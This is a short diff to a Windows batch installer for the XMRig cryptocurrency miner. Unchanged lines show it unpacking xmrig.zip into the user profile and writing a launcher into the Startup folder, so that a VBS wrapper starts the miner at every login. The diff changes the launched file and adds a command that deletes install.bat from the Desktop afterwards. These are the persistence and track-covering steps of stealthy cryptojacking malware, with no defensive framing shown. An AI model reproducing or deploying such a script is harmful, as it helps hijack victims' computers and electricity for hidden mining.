@@ -10,8 +10,10 @@ powershell -Command "Expand-Archive -Path 'xmrig.zip' -DestinationPath '%USERPRO
 set startupFolder=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 set startupFile=%startupFolder%\start_xmrig.bat
 
-echo wscript.exe "%USERPROFILE%\XMR\inv.vbs" "%USERPROFILE%\XMR\start.vbs" > "%startupFile%"
+echo wscript.exe "%USERPROFILE%\XMR\inv.vbs" "%USERPROFILE%\XMR\start.bat" > "%startupFile%"
 
 endlocal
+
+del "%USERPROFILE%\Desktop\install.bat"
 
 exit
